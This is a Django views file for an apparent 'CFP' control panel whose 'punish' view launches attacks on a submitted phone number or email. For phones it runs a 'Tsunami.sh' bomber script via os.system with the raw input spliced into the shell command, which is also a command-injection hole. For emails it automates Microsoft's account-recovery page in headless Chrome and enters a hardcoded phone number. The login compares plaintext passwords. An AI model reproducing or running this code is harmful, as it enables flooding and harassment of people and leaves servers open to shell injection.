from django.shortcuts import render
from django.http import HttpResponse
import os
from .models import CFPUsers
from selenium import webdriver
import time
# Create your views here.

def index(request):
    #return HttpResponse("CFP")
    return render(request,'index.html')

def Login(request):
    uname = request.POST.get('UName')
    Email = request.POST.get('email')
    pswd = request.POST.get('pswd')
    # retrieving PhoneNo from SpamUsers Model
    UName_list = [u.UName for u in CFPUsers.objects.all()]
    # check if  exist in SpamUser Model
    if uname in UName_list:
        ucred = CFPUsers.objects.get(UName=uname)
        if pswd == ucred.password:
            #return HttpResponse("CFP Login Success")
            return render(request,'CFP_Panel.html')
        else:
            return HttpResponse("Email or Password Wrong... Enter Correct details")
    else:
        return HttpResponse("You Don't have permission, Contact CyberSapiens")

def punish(request):
   try:
    phno = request.POST.get('PhoneNo')
    email = request.POST.get('Email')

    print(phno)
    print(email)

    if phno:
        os.system("chmod +x ./static/Bomber/Tsunami.sh")
        os.system("printf '" + phno + "\n1\n' | ./static/Bomber/Tsunami.sh")
        return HttpResponse("<h2>Attacking on " + phno + "</h2>")
    elif email:
        print(type(email))
        chrome_options = webdriver.ChromeOptions()
        chrome_options.binary_location = os.environ.get("GOOGLE_CHROME_BIN")
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--no-sandbox")
        driver = webdriver.Chrome(executable_path=os.environ.get("CHROMEDRIVER_PATH"), chrome_options=chrome_options)

        driver.get("https://account.live.com/username/recover?wreply=https://login.live.com/login.srf%3flc%3d16393%26mkt%3dEN-IN%26wa%3dwsignin1.0%26rpsnv%3d13%26rver%3d7.3.6963.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252fwww.microsoft.com%252fen-in%26lc%3d16393%26id%3d74335%26aadredir%3d1%26contextid%3dD7863DDDCB3736D9%26bk%3d1638344122%26uaid%3d91cf15d70bbe4c11ae57ce8b069c8047&id=74335&mkt=EN-IN&lc=16393&uaid=91cf15d70bbe4c11ae57ce8b069c8047&uiflavor=web")
        tf=driver.find_element('//*[@id="proofInputField"]')
        #print(tf)
        tf.send_keys('7975847196')

        #print(driver.page_source)

   except Exception as e:
       return HttpResponse("<h2>Attacking on finished</h2>")
   return render(request, 'CFP_Panel.html')
